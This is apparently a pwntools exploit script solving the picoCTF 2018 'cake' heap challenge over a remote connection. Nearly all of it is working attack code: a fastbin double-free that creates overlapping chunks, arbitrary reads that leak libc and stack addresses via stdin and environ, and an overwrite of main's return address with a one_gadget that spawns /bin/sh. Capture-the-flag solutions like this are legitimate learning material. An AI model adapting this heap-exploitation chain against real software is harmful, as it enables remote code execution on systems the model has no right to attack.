#!/usr/bin/python

from pwn import *

# conn = process("./cake")
conn = remote("2018shell2.picoctf.com", 54086)

def wait_prompt():
    conn.recvuntil("In total, you have sold $")

def make_cake(price, name):
    conn.send("M\n")
    conn.recvuntil("Made cake ")
    cake_index = int(conn.recvline()[:-2])
    conn.send(name + "\n")
    conn.send(str(price) + "\n")
    return cake_index

def serve(cake_index):
    conn.send("S\n" + str(cake_index) + "\n")
    return wait_prompt()

def inspect(cake_index):
    conn.send("I\n" + str(cake_index) + "\n")
    conn.recvuntil(" is being sold for $")
    price=int(conn.recvline()[:-1])
    return price

cake = ELF("./cake")
shop = cake.symbols['shop']
stdin = cake.symbols['stdin']

# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./libc.so.6")

file_IO_2_1_stdin_ = libc.symbols['_IO_2_1_stdin_']
file_environ = libc.symbols['environ']
file_libc_text = libc.get_section_by_name('.text').header.sh_addr
print("shop = 0x%x stdin = 0x%x libc.text = 0x%x libc.stdin = 0x%x libc.environ = 0x%x" % (shop, stdin, file_libc_text, file_IO_2_1_stdin_, file_environ))

# We will create a circular 0x20 byte chunk and place it in fastbin[0].
# Ensure [shop + 0x8] stays within range of [0x20, 0x2f] throughout
# the test.
#                shop -> total sales revenue (value doesn't matter)
#         shop + 0x08 -> number of customers waiting [0x20, 0x2f]
#         shop + 0x10 -> shop
#         shop + 0x18 -> used for arbitary reading and writing
conn.send("T\n" * 108)
for i in range(109):
    wait_prompt()

c0 = make_cake(0x0, p64(0x0))     # chunk_0
c1 = make_cake(0x0, '')    # chunk_1

serve(c0)
serve(c1)
serve(c0)
chunk_1 = inspect(c0)
chunk_0 = inspect(c1)

assert chunk_0 + 0x20 == chunk_1, "fatal error"
print("chunk_0 0x%x chunk_1 0x%x" % (chunk_0, chunk_1))

c2 = make_cake(shop, p64(0x0)) # malloc return chunk_0
c3 = make_cake(0x0, '')        # malloc return chunk_1
c4 = make_cake(shop, p64(0x21)) # malloc return chunk_0

# malloc will return "shop + 0x10" (pointing to shop->cakes[0])
# The following chunk will be placed in fastbin. As long as
# we keep [shop + 0x08] in the range of 0x20~2f, malloc(0x10)
# will return "shop + 0x10" forever.
#           shop --> total sales revenue
#    shop + 0x08 --> number of customer served
#    shop + 0x10 --> shop (pointing back to shop)
c5 = make_cake(shop, p64(stdin))
_IO_2_1_stdin_ = inspect(1)

libc_reloc_delta = _IO_2_1_stdin_ - file_IO_2_1_stdin_
libc_text = libc_reloc_delta + file_libc_text
libc_environ = libc_reloc_delta + file_environ
print("libc: reloc_delta 0x%x .text 0x%x environ 0x%x" % (libc_reloc_delta, libc_text, libc_environ))

c6 = make_cake(0x0, p64(0x21))      # chunk_0 + 0x10

# now get stack address via libc.environ
serve(c2)   # chunk_0
serve(c3)   # chunk_1
serve(c2)   # chunk_0

c7 = make_cake(shop, p64(0x0))     # chunk_0
c8 = make_cake(0x0, '')             # chunk_1
c9 = make_cake(shop, p64(0x0))    # chunk_0

# environ points to stack address
c10 = make_cake(shop, p64(libc_environ))
stack_address = inspect(1)

# get main return address in respects to environ stack address
main_return_address = stack_address - 0x108 + 0x18

print("main return address: rsp 0x%x" % (main_return_address))

# release [shop + 0x18] (cake #1)
c11 = make_cake(shop, p64(0))

# found by one_gadget tool :D  (see https://github.com/david942j/one_gadget)
#   0x45216	execve("/bin/sh", rsp+0x30, environ)
#   constraints:
#     rax == NULL
# 'main' always returns 0, so rax is indeed NULL and thus we can use this.
one_gadget=0x45216 + libc_reloc_delta

# this will be placed in cake #1
#
#       shop + 0x10 -> shop         --> price
#       shop + 0x18 -> shop + 0x10  --> name
# when 'make_cake' reads the name, it replaces "shop + 0x18" with
# a pointer to the stack address storing the  main function's return address.
# when 'make_cake' reads the price, it writes the price we choose
# into the stack location we set above!!!
c1 = make_cake(one_gadget, p64(main_return_address))

# close the shop - it should return to one_gadget
conn.send("C\n")

conn.interactive()

